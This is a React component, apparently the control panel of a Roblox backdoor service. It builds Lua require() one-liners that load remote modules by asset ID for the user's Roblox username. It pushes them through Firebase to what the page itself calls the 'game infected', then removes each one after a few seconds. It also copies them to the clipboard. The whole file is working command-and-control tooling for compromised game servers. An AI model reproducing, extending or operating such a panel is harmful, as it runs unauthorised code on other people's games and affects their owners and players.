import Nav from "../../components/Cabeçario";
import { useEffect, useState } from "react";
import axios from "axios";
import "./styles.css";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faUnity } from "@fortawesome/free-brands-svg-icons";
import {
  faMagnifyingGlass,
  faPlay,
  faCopy,
  faCube,
  faRotate,
} from "@fortawesome/free-solid-svg-icons";
import { database, ref, set, remove } from "../../firebaseConfig";
import Popup from "../../components/Popup";

function ScriptLibrary() {
  const [userData, setUserData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [showPopup, setShowPopup] = useState(false);
  const [popupText, setPopupText] = useState("");
  const [popupError, setPopupError] = useState(false);
  const [searchTerm, setSearchTerm] = useState("");

  useEffect(() => {
    const getUserId = () => {
      try {
        return (
          localStorage.getItem("userId") || sessionStorage.getItem("userId")
        );
      } catch (err) {
        console.error("Erro ao acessar o armazenamento:", err);
        return null;
      }
    };

    const userId = getUserId();

    if (!userId) {
      setError("User ID não encontrado.");
      setLoading(false);
      return;
    }

    const fetchUserData = async () => {
      try {
        const response = await axios.get(`https://eclipse-backend-9lxy.onrender.com/user?userId=${userId}`);
        setUserData(response.data);
      } catch (err) {
        console.error("Erro ao buscar usuário:", err);
        setError("Erro ao buscar usuário.");
      } finally {
        setLoading(false);
      }
    };

    fetchUserData();
  }, []);

  if (loading) return <p>undefined</p>;
  if (error) return <p>{error}</p>;

  async function sendToRealtimeDB(requireId, format) {
    try {
      const userId = localStorage.getItem("userId");

      if (!userId) {
        console.error("userId não encontrado no armazenamento.");
        setPopupText("Error: userId not found.");
        setPopupError(true);
        setShowPopup(true);
        setTimeout(() => setShowPopup(false), 4000);
        return;
      }

      const response = await fetch(`https://eclipse-backend-9lxy.onrender.com/user?userId=${userId}`);

      if (!response.ok) {
        console.error("Erro ao obter o robloxUsername.");
        setPopupText("Error: Unable to fetch robloxUsername.");
        setPopupError(true);
        setShowPopup(true);
        setTimeout(() => setShowPopup(false), 4000);
        return;
      }

      const data = await response.json();
      const robloxUsername = data.robloxUsername;

      if (!robloxUsername) {
        console.error("robloxUsername não encontrado.");
        setPopupText(
          "Error: robloxUsername not found. Please add your robloxUsername to the whitelist located on the Dashboard screen."
        );
        setPopupError(true);
        setShowPopup(true);
        setTimeout(() => setShowPopup(false), 4000);
        return;
      }

      let scriptData;

      if (format === "sensation") {
        scriptData = `require(85380043749737)("${robloxUsername}")`;
      } else if (format === "pipboy") {
        scriptData = `require(5732936861).fehack("${robloxUsername}")`;
      } else if (format === "R6") {
        scriptData = `require(72724783812409):R6("${robloxUsername}")`;
      } else if (format === "RE") {
        scriptData = `local player = game:GetService("Players"):FindFirstChild("${robloxUsername}") if player and player.Character then player:LoadCharacter()end`;
      } else if (format === "Reality") {
        scriptData = `require(4780399515).load("${robloxUsername}")`;
      } else if (format === "tank") {
        scriptData = `require(5068511197).insert("${robloxUsername}")`;
      } else if (format === "Mrbyebye") {
        scriptData = `require(0xB4AF21B4):Start("${robloxUsername}",'AAA')`;
      } else if (format === "Lunatic") {
        scriptData = `require(5813708464).load("${robloxUsername}")`;
      } else if (format === "undertale") {
        scriptData = `require(7409193749).load("${robloxUsername}")`;
      } else if (format === "gojo") {
        scriptData = `require(14499140823)("${robloxUsername}", "sorcerer")`;
      } else if (format === "road") {
        scriptData = `require(7473216460).load("${robloxUsername}")`;
      } else if (format === "kj") {
        scriptData = `require(89529616632600)("${robloxUsername}", "KJ")`;
      } else {
        return;
      }

      const scriptRef = ref(database, "require/" + requireId);
      await set(scriptRef, scriptData);

      console.log("Script enviado para o Firebase com sucesso!");

      setPopupText("Script successfully sent to game infected!");
      setPopupError(false);
      setShowPopup(true);

      setTimeout(() => setShowPopup(false), 4000);

      setTimeout(async () => {
        try {
          await remove(scriptRef);
          console.log("Script excluído do game infected após 6 segundos.");
        } catch (error) {
          console.error("Erro ao remover script do game infected:", error);
        }
      }, 4000);
    } catch (error) {
      console.error("Erro ao enviar script para o game infected:", error);

      setPopupText("Error sending script to game infected.");
      setPopupError(true);
      setShowPopup(true);

      setTimeout(() => setShowPopup(false), 4000);
    }
  }

  async function handleCopy(format) {
    try {
      const userId = localStorage.getItem("userId");

      if (!userId) {
        setPopupText("Error: userId not found.");
        setPopupError(true);
        setShowPopup(true);
        setTimeout(() => setShowPopup(false), 4000);
        return;
      }

      const response = await fetch(`https://eclipse-backend-9lxy.onrender.com/user?userId=${userId}`);

      if (!response.ok) {
        setPopupText("Error: Unable to fetch user data.");
        setPopupError(true);
        setShowPopup(true);
        setTimeout(() => setShowPopup(false), 4000);
        return;
      }

      const data = await response.json();
      const robloxUsername = data.robloxUsername;

      if (!robloxUsername) {
        setPopupText(
          "Error: robloxUsername not found. Please add your robloxUsername to the whitelist located on the Dashboard screen."
        );
        setPopupError(true);
        setShowPopup(true);
        setTimeout(() => setShowPopup(false), 4000);
        return;
      }

      let scriptData = "";

      switch (format) {
        case "sensation":
          scriptData = `require(85380043749737)("${robloxUsername}")`;
          break;
        case "pipboy":
          scriptData = `require(5732936861).fehack("${robloxUsername}")`;
          break;
        case "R6":
          scriptData = `require(72724783812409):R6("${robloxUsername}")`;
          break;
        case "Reality":
          scriptData = `require(4780399515).load("${robloxUsername}")`;
          break;
        case "tank":
          scriptData = `require(5068511197).insert("${robloxUsername}")`;
          break;
        case "Mrbyebye":
          scriptData = `require(0xB4AF21B4):Start("${robloxUsername}",'AAA')`;
          break;
        case "Lunatic":
          scriptData = `require(5813708464).load("${robloxUsername}")`;
          break;
        case "undertale":
          scriptData = `require(7409193749).load("${robloxUsername}")`;
          break;
        case "gojo":
          scriptData = `require(14499140823)("${robloxUsername}", "sorcerer")`;
          break;
        case "road":
          scriptData = `require(7473216460).load("${robloxUsername}")`;
          break;
        case "kj":
          scriptData = `require(89529616632600)("${robloxUsername}", "KJ")`;
          break;
        default:
          setPopupText("Error: Invalid format.");
          setPopupError(true);
          setShowPopup(true);
          setTimeout(() => setShowPopup(false), 4000);
          return;
      }

      console.log(`✅ Script gerado: ${scriptData}`);

      await navigator.clipboard.writeText(scriptData);

      setPopupText("Script copied to clipboard successfully!");
      setPopupError(false);
      setShowPopup(true);

      setTimeout(() => setShowPopup(false), 4000);
    } catch (error) {
      console.error("❌ Erro ao copiar o script:", error);

      setPopupText("Error copying the script.");
      setPopupError(true);
      setShowPopup(true);

      setTimeout(() => setShowPopup(false), 4000);
    }
  }

  const scripts = [
    { id: "sensation", name: "Sensation Safe" },
    { id: "pipboy", name: "PipBoy" },
    { id: "Reality", name: "Reality Orb" },
    { id: "tank", name: "Military Tank" },
    { id: "Mrbyebye", name: "Mr. bye bye" },
    { id: "Lunatic", name: "Lunatic" },
    { id: "undertale", name: "Undertale" },
    { id: "gojo", name: "Gojo" },
    { id: "road", name: "Road Rogue" },
    { id: "kj", name: "KJ" }
  ];
  
    const filteredScripts = scripts.filter((script) =>
      script.name.toLowerCase().includes(searchTerm.toLowerCase())
    );

  return (
    <div className="mainScript">
      {showPopup && <Popup error={popupError} text={popupText} />}
      <Nav
        title="Script Library"
        subtitle="Your name must be the same as Roblox"
        searchWidth="70%"
      />
      <div className="main-script">
        <div className="search">
          <div className="box" onClick={() => sendToRealtimeDB("", "RE")}>
            <FontAwesomeIcon icon={faRotate} style={{ color: "#c9c9c9" }} />
            <p>RE</p>
          </div>
          <div className="box" onClick={() => sendToRealtimeDB("", "R6")}>
            <FontAwesomeIcon icon={faCube} style={{ color: "#c9c9c9" }} />
            <p>R6</p>
          </div>
          <div className="icon">
            <FontAwesomeIcon icon={faMagnifyingGlass} color="#c9c9c952" />
          </div>
          <input
            type="text"
            placeholder="Search..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
        </div>

        <div className="boxs-content">
          {filteredScripts.map((script) => (
            <div key={script.id} className="box">
              <div className="plan">
                {userData ? <p>{userData.discordRole}</p> : <p>undefined</p>}
              </div>
              <div className="icon">
                <FontAwesomeIcon
                  icon={faUnity}
                  style={{ fontSize: "5.5rem", color: "#c9c9c9" }}
                />
              </div>
              <div className="text">
                <p>must be in the infected game</p>
                <h1>{script.name}</h1>
              </div>
              <div className="inte">
                <div className="copy" onClick={() => handleCopy(script.id)}>
                  <div className="icon-run">
                    <FontAwesomeIcon
                      icon={faCopy}
                      style={{ color: "#c9c9c9" }}
                    />
                    <p>Copy</p>
                  </div>
                </div>
                <div
                  className="run a"
                  onClick={() => sendToRealtimeDB("", script.id)}
                >
                  <div className="icon-run">
                    <FontAwesomeIcon
                      icon={faPlay}
                      style={{ color: "#c9c9c9" }}
                    />
                  </div>
                </div>
              </div>
            </div>
          ))}
          {filteredScripts.length === 0 && <p>No results found.</p>}
        </div>
      </div>
    </div>
  );
}

export default ScriptLibrary;
